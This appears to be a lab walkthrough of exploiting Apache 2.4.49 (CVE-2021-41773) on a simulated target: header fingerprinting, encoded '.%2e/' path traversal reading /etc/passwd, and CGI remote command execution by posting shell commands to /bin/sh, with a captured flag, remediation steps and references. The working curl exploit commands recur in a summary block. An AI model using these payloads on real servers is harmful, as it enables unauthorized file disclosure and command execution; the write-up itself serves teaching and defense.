# M08 | Apache Path Traversal and Remote Code Execution (RCE)

**Mission:** M08 // CRITICAL  
**Status:** Completed, flag captured  
**Environment:** Simulated browser-based Kali/Linux security lab  
**Target:** `10.0.1.10`  
**Service:** Apache HTTP Server 2.4.49 (Unix)  
**Port:** `80/tcp` (HTTP)  
**Primary vulnerability:** CVE-2021-41773, path traversal with conditional RCE  
**Related vulnerability:** CVE-2021-42013, incomplete patch bypass affecting Apache 2.4.50 (also listed as affecting 2.4.49)  
**Weakness:** CWE-22, Path Traversal  
**Severity:** Critical, **9.8 CVSS v3.1** in the lab and NVD's RCE-impact assessment  
**Captured flag:** `6d2261977473a42bb17b9ea982c452aa`  
**Lab artifact:** `~/flags/flag7.txt`

> **Scope:** These are the commands and results from the explicitly simulated M08 target. The commands below reproduce the lab exercise; observed terminal output is distinguished from illustrative output.

## Executive summary

M08 demonstrated an unauthenticated compromise of an Apache 2.4.49 server in three stages:

1. **Fingerprint:** An HTTP HEAD request identified Apache 2.4.49. The `/cgi-bin/` endpoint returned HTTP 403.
2. **Read an unintended file:** An encoded dot-segment traversal (`.%2e/`) bypassed Apache's vulnerable URL path normalization and returned `/etc/passwd` with HTTP 200.
3. **Execute a command through CGI:** An HTTP POST aimed through the traversed CGI alias at `/bin/sh` supplied shell commands on standard input. The lab confirmed RCE and awarded the flag.

The core lesson is the interaction of **incorrect URL normalization**, **permissive filesystem access**, and **executable CGI handling**. Path traversal alone can disclose files; CGI execution can turn it into command execution in a vulnerable configuration.

---

## Step 1 | Version fingerprinting and CGI endpoint reconnaissance

### Goal

Identify the server version and look for a CGI-related URL before testing the specific vulnerability.

### Command A: Fetch server headers

```bash
curl -I http://10.0.1.10/
```

| Component | Description | Why it matters |
|---|---|---|
| `curl` | Command-line HTTP client. | Communicates with the web server. |
| `-I` / `--head` | Sends an HTTP `HEAD` request and displays response headers rather than the response body. | Quickly inspects headers, including `Server`. |
| `http://` | Specifies plain HTTP. | The target listens on port 80. |
| `10.0.1.10` | Lab server IP address. | Defines the target. |
| `/` | Root URL path. | Tests the site's primary endpoint. |

**Observed output excerpt:**

```http
Server: Apache/2.4.49 (Unix)
Content-Type: text/html; charset=UTF-8
Content-Length: 408
```

**Reasoning:** Apache HTTP Server **2.4.49** contains the path-normalization flaw tracked as **CVE-2021-41773**. A server header is useful version evidence, but it is not a standalone proof of exploitability: HTTP headers can be customized and the filesystem access configuration matters.

### Command B: Check the CGI path

```bash
curl -I http://10.0.1.10/cgi-bin/
```

| Component | Description | Why it matters |
|---|---|---|
| `-I` | Requests headers only. | Retrieves the HTTP status without a response body. |
| `/cgi-bin/` | Conventional CGI URL prefix. | Checks how the server handles this path. |

**Observed output excerpt:**

```http
HTTP/1.1 403 Forbidden
Server: Apache/2.4.49
```

**Interpretation:** The lab classified the `403 Forbidden` response as a sign of an enabled CGI path. Strictly speaking, **HTTP 403 does not by itself confirm that `mod_cgi` is loaded or that RCE is possible**: it only means the requested resource was denied. Subsequent successful execution in Step 3 establishes the effective CGI execution condition for this particular lab.

### Step 1 result

**Apache 2.4.49 identified; `/cgi-bin/` endpoint returned HTTP 403.** The lab marked Step 1 complete.

---

## Step 2 | Encoded path traversal to read `/etc/passwd`

### Goal

Show that crafted URL paths can escape the directory the web server was meant to expose and retrieve a system file without authentication.

### Command

```bash
curl --path-as-is 'http://10.0.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
```

The lab also echoed an equivalent request that added `-s` for quiet output:

```bash
curl -s --path-as-is 'http://10.0.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'
```

### Parameter and payload breakdown

| Component | Description | Why it matters |
|---|---|---|
| `curl` | Sends the HTTP request. | Delivers the crafted path. |
| `-s` / `--silent` (optional) | Suppresses the progress meter and most routine curl messages. | Makes the response body easier to read. |
| `--path-as-is` | Tells curl not to normalize `/./` and `/../` path segments before sending the request. | Preserves the traversal payload for server-side processing. |
| `http://10.0.1.10` | Target HTTP endpoint. | Sends the request to Apache on port 80. |
| `/cgi-bin/` | Server URL path used as the traversal starting point. | The configured alias supplies a directory mapping that can be escaped. |
| `.%2e/` | A literal dot followed by URL-encoded dot (`%2e` = `.`); after decoding, this is `../`. | Attempts to move to the parent directory while bypassing vulnerable normalization. |
| Four repetitions of `.%2e/` | Multiple parent-directory movements. | Traverse upward toward filesystem root; required count depends on the mapped directory. |
| `etc/passwd` | Requested file after traversal. | Tests whether an OS file outside the intended served directory can be retrieved. |

### Why the encoded sequence works

`%2e` is the percent-encoded form of `.` (ASCII `0x2E`). The payload uses **a literal dot plus an encoded dot**, so `.%2e/` represents `../` after decoding. The flaw in Apache 2.4.49's path normalization could permit this representation to slip past directory-boundary handling.

Conceptual resolution:

```text
Request path:
/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd

Decoded traversal segments:
/cgi-bin/../../../../etc/passwd

Effective target in the vulnerable configuration:
/etc/passwd
```

This is **directory traversal, not authentication bypass** in the strict sense: no login was required to request the exposed HTTP resource, but the key failure was the server's resolution of the requested path outside its configured directory.

### Observed result

```http
HTTP/1.1 200 OK
```

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
```

**Interpretation:** The `200 OK` response and recognizable `/etc/passwd` contents confirm **unauthorized file disclosure through path traversal**. The `x` entries are password-field placeholders, not plaintext account passwords.

### Step 2 result

**Path traversal confirmed and `/etc/passwd` disclosed.** The lab marked Step 2 complete.

---

## Step 3 | CGI-based remote command execution

### Goal

Demonstrate that the same traversal path can reach an executable program and, because CGI execution is enabled in this configuration, feed commands into `/bin/sh` through an HTTP POST body.

### Command A: Confirm the command-execution mechanism

```bash
curl -s --path-as-is \
  -d 'echo Content-Type: text/plain; echo; id' \
  'http://10.0.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

| Component | Description | Why it matters |
|---|---|---|
| `curl` | HTTP client. | Sends the request to the vulnerable server. |
| `-s` / `--silent` | Reduces progress/status noise. | Keeps command output readable. |
| `--path-as-is` | Preserves the crafted traversal path. | Keeps the bypass sequence in the request target. |
| `-d` / `--data` | Supplies an HTTP request body and makes curl use POST (unless overridden). | CGI can pass the body to the executed program through standard input. |
| `'echo Content-Type: text/plain; echo; id'` | Shell input submitted as POST data. | Produces a CGI response header, blank separator line, and then executes `id`. |
| `echo Content-Type: text/plain` | Outputs a valid CGI `Content-Type` response header. | Helps the CGI response be interpreted correctly. |
| `echo` | Outputs the required blank line after CGI headers. | Separates CGI headers from the response body. |
| `id` | Reports the process user's UID, GID, and groups. | Tests command execution without modifying files. |
| `/cgi-bin/` | URL prefix mapped to CGI execution in the lab. | Makes executing the resolved target possible. |
| Repeated `.%2e/` | Traversal sequence. | Escapes the CGI directory mapping. |
| `bin/sh` | Shell program targeted outside the CGI directory. | Interprets the POST body as shell commands if executed by CGI. |

**Illustrative success output, not separately captured in the supplied lab transcript:**

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This would indicate command execution under the Apache worker's operating-system identity. The specific identity depends on the configuration.

### Command B: Read the lab flag

```bash
curl -s --path-as-is \
  -d 'echo Content-Type: text/plain; echo; cat /flag.txt' \
  'http://10.0.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

The request structure is the same, except **`cat /flag.txt`** replaces **`id`**:

| Component | Description |
|---|---|
| `cat` | Reads a file and writes its contents to standard output. |
| `/flag.txt` | Lab flag path specified by the exercise. |
| CGI POST body | Supplies commands to the shell via standard input in this vulnerable setup. |

**Confirmed lab outcome:**

```text
Flag Captured!
6d2261977473a42bb17b9ea982c452aa
~/flags/flag7.txt created
```

The final lab completion message confirms **unauthenticated RCE** and flag capture. The full HTTP response to each Step 3 command was not provided, so those intermediate outputs are not claimed as direct observations.

### Why Step 3 is more severe than Step 2

- **Step 2, confidentiality:** The server returns files that should not be web-accessible.
- **Step 3, integrity and availability as well:** CGI execution makes it possible to run system commands with the privileges of the Apache process.
- **Privilege context:** Execution as `www-data` is not the same as root access. It is still an RCE finding with significant potential impact.

### Step 3 result

**Lab-confirmed CGI-based RCE and flag capture. M08 completed.**

---

## Vulnerability analysis

| Attribute | Finding |
|---|---|
| Main weakness | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
| Primary CVE exploited | CVE-2021-41773 (Apache 2.4.49) |
| Related CVE | CVE-2021-42013, Apache 2.4.50 incomplete-fix bypass |
| Root technical cause | Incorrect normalization of encoded dot segments in a request URI |
| Necessary exploitation conditions | Vulnerable version; suitable Alias-like mapping; insufficient filesystem access restrictions; CGI execution enabled for the RCE path |
| Authentication needed | None in the lab |
| Proven impacts | Disclosure of `/etc/passwd`; lab-confirmed OS command execution |
| Severity | Lab: 9.8/10 Critical (CVSS v3.1). Published scores vary by whether RCE-capable configurations are considered. |

### CVE version distinction

- **2.4.49:** CVE-2021-41773 was introduced in this release.
- **2.4.50:** Its attempted fix was incomplete, leading to CVE-2021-42013.
- **2.4.51:** Fixed the traversal vulnerabilities described here.
- **Recommended remediation today:** Run a currently supported, up-to-date Apache release, not merely the historical minimum of 2.4.51.

### Important evidentiary distinction

A **403 on `/cgi-bin/` is not sufficient proof of `mod_cgi` being active**. It could result from many Apache authorization or directory settings. In this mission, the final successful CGI command-execution exercise provides the stronger evidence.

---

## Remediation

1. **Patch Apache HTTP Server.** Upgrade to a currently supported release with the CVE-2021-41773 and CVE-2021-42013 fixes; Apache 2.4.51 was the first release with the complete historical fix.
2. **Enforce filesystem access restrictions.** Deny access outside explicitly served directories. For example, an appropriately scoped baseline restriction in Apache configuration is:

   ```apache
   <Directory />
       Require all denied
   </Directory>
   ```

   Explicitly grant access only to intended web content directories.
3. **Disable unused CGI capabilities.** Remove or disable `mod_cgi` / `mod_cgid` and CGI execution handlers if they are not needed; review `ScriptAlias`, `Options ExecCGI`, and related handler mappings.
4. **Limit the attack surface.** Avoid exposing unnecessary aliases and directory mappings; keep read and execute permissions minimal.
5. **Validate the fix.** Confirm the server version, check that encoded traversal requests cannot read outside intended directories, and verify that CGI execution cannot reach arbitrary OS executables.
6. **Use WAF rules as supplementary mitigation.** Detect or block suspicious encoded traversal requests, but do not treat WAF filtering as a substitute for upgrading and correcting directory policy.

---

## Commands at a glance

```bash
# 1. Fingerprint the server
curl -I http://10.0.1.10/

# 1. Check the CGI endpoint
curl -I http://10.0.1.10/cgi-bin/

# 2. Demonstrate directory traversal and unauthorized file reading
curl --path-as-is 'http://10.0.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd'

# 3. Exercise the lab's CGI command-execution condition
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' \
  'http://10.0.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'

# 3. Retrieve the simulated challenge flag
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; cat /flag.txt' \
  'http://10.0.1.10/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'
```

## Key takeaways

- Fingerprinting narrows the vulnerability hypothesis, but **behavioral testing confirms impact**.
- `--path-as-is` is important because it prevents the HTTP client from removing path segments before the server receives them.
- `.%2e/` demonstrates how alternate encodings of `../` can expose weaknesses in URL canonicalization.
- URL path traversal can move from **file disclosure** to **RCE** when it intersects with unsafe executable CGI mapping.
- Effective remediation requires **patched software plus restrictive authorization of filesystem paths and executable handlers**.

## References

1. Apache HTTP Server Project, *Apache HTTP Server 2.4 vulnerabilities*: https://httpd.apache.org/security/vulnerabilities_24.html
2. NIST National Vulnerability Database, *CVE-2021-41773*: https://nvd.nist.gov/vuln/detail/CVE-2021-41773
3. NIST National Vulnerability Database, *CVE-2021-42013*: https://nvd.nist.gov/vuln/detail/CVE-2021-42013
4. curl, *Command-line tool manual (`-I`, `-d`, `-s`, `--path-as-is`)*: https://curl.se/docs/manpage.html
5. MITRE CWE, *CWE-22: Path Traversal*: https://cwe.mitre.org/data/definitions/22.html

---

**Final result:** M08 passed. Encoded Apache path traversal was confirmed, unauthenticated CGI-based RCE was confirmed by the lab, and flag `6d2261977473a42bb17b9ea982c452aa` was captured.
